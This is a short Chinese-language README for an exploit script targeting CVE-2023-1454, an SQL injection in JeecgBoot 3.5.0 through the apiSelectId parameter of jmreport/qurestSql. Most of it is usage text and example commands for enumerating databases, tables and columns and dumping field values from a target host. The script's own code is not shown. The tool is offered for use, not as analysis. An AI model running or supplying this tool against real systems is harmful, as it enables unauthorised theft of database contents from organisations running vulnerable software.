# JeecgBoot SQL（CVE-2023-1454）exp

## 1.漏洞详情

jeecg-boot 3.5.0版本存在SQL注入漏洞，该漏洞源于文件 jmreport/qurestSql 存在安全问题， 通过参数 apiSelectId 导致SQL注入。

## 2.使用方法


```
python3 CVE-2023-1454.py
optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Specify the base URL
  --current-db          View current database
  --dbs                 View all databases
  -D DATABASE, --database DATABASE
                        Specify the database name
  --tables              View tables in the specified database
  -T TABLE, --table TABLE
                        Specify the table name
  --columns             View columns in the specified table
  -C COLUMN, --column COLUMN
                        Specify the column name

Example:
python3 CVE-2023-1454.py -u xxx.com --current-db  查看当前使用数据库名
python3 CVE-2023-1454.py -u xxx.com -dbs  查看所有数据库名
python3 CVE-2023-1454.py -u xxx.com -D 数据库名 --tables 查看数据库下的表名
python3 CVE-2023-1454.py -u xxx.com -D 数据库名 -T 表名 --columns 查看表下的字段名
python3 CVE-2023-1454.py -u xxx.com -D 数据库名 -T 表名 -C 字段名  查看字段
```

